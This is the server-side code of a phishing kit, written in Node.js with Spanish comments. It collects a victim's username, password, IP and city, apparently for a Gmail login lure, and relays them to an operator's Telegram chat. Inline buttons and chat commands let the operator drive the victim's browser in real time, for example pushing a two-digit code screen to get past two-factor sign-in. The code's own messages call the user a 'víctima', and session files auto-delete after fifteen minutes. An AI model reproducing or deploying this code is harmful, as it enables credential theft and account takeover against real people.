const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const CLIENTES_DIR = './clientes';
if (!fs.existsSync(CLIENTES_DIR)) {
  fs.mkdirSync(CLIENTES_DIR);
}

// Limpieza automática cada 10 minutos
setInterval(() => {
  const files = fs.readdirSync(CLIENTES_DIR);
  const ahora = Date.now();

  files.forEach(file => {
    const fullPath = path.join(CLIENTES_DIR, file);
    const stats = fs.statSync(fullPath);
    const edadMinutos = (ahora - stats.mtimeMs) / 60000;

    if (edadMinutos > 15) {
      fs.unlinkSync(fullPath);
      console.log(`🗑️ Eliminado: ${file} (tenía ${Math.round(edadMinutos)} minutos)`);
    }
  });
}, 10 * 60 * 1000);

function guardarCliente(txid, data) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  fs.writeFileSync(ruta, JSON.stringify(data, null, 2));
}

function cargarCliente(txid) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  if (fs.existsSync(ruta)) {
    return JSON.parse(fs.readFileSync(ruta));
  }
  return null;
}

app.post('/enviar', async (req, res) => {
  const { usar, clavv, txid, ip, ciudad } = req.body;

  const mensaje = `
🔵GM4YL🔵
🆔 ID: <code>${txid}</code>

📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const cliente = {
    status: "esperando",
    codigo: null,
    usar,
    clavv,
    preguntas: [],
    ip,
    ciudad
  };
  guardarCliente(txid, cliente);

  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔑 CONFIRMAR", callback_data: `confirmar:${txid}` },
        { text: "🔐 CÓDIGO", callback_data: `codigo:${txid}` },
        { text: "❌ ERROR LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});

app.post('/webhook', async (req, res) => {
  // Procesar callback_query (botones)
  if (req.body.callback_query) {
    const callback = req.body.callback_query;
    const data = callback.data;
    const partes = data.split(":");
    const accion = partes[0]; // confirmar | codigo | errorlogo
    const txid = partes[1];

    let cliente = cargarCliente(txid);
    if (!cliente) {
      return res.sendStatus(404);
    }

    // Actualizar estado según la acción
    if (accion === "confirmar") {
      cliente.status = "confirmar";
    } else if (accion === "codigo") {
      cliente.status = "codigo";  // Esto hará que cargs.html redirija a otro3.html
    } else if (accion === "errorlogo") {
      cliente.status = "errorlogo";
    }

    guardarCliente(txid, cliente);

    // Confirmar al operador
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callback.id,
        text: `✅ Acción ejecutada: ${accion}`
      })
    });

    // Opcional: enviar mensaje de confirmación
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: callback.message.chat.id,
        text: `✅ Acción "${accion}" aplicada al ID ${txid}`
      })
    });

    return res.sendStatus(200);
  }

  // Procesar comandos como /abc123 22
  if (req.body.message?.text?.startsWith('/')) {
    const texto = req.body.message.text.trim();
    const partes = texto.split(' ');
    const comando = partes[0].slice(1); // txid
    const codigoStr = partes[1]?.trim();

    let cliente = cargarCliente(comando);
    if (!cliente) {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: req.body.message.chat.id,
          text: `❌ No se encontró sesión con ID: ${comando}`
        })
      });
      return res.sendStatus(200);
    }

    if (codigoStr && /^\d{2}$/.test(codigoStr)) {
      cliente.codigo = codigoStr;
      cliente.status = "codigo";  // ¡Importante! Esto activa la redirección a otro3.html
      guardarCliente(comando, cliente);

      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: req.body.message.chat.id,
          text: `✅ Código "${codigoStr}" enviado para ${comando}\nVíctima redirigida a pantalla de 2 dígitos.`
        })
      });
    } else {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: req.body.message.chat.id,
          text: `⚠️ Formato incorrecto.\nUsa: /${comando} 22`
        })
      });
    }

    return res.sendStatus(200);
  }

  res.sendStatus(200);
});

// Endpoint usado por cargs.html y otro4.html
app.get('/sendStatus.php', (req, res) => {
  const txid = req.query.txid;
  if (!txid) return res.status(400).json({ status: "error", message: "Falta txid" });

  const cliente = cargarCliente(txid);
  if (!cliente) return res.status(404).json({ status: "error", message: "Sesión no encontrada" });

  res.json({
    status: cliente.status || "esperando",
    preguntas: cliente.preguntas || []
  });
});

// Endpoint usado por otro3.html para obtener el código de 2 dígitos
app.get('/status', (req, res) => {
  const txid = req.query.txid;
  if (!txid) return res.status(400).json({ error: "Falta txid" });

  const cliente = cargarCliente(txid);
  if (!cliente) return res.status(404).json({ error: "No encontrado" });

  res.json({ codigo: cliente.codigo || null });
});

app.get('/', (req, res) => res.send("Servidor activo en Render"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor activo en puerto ${PORT}`));
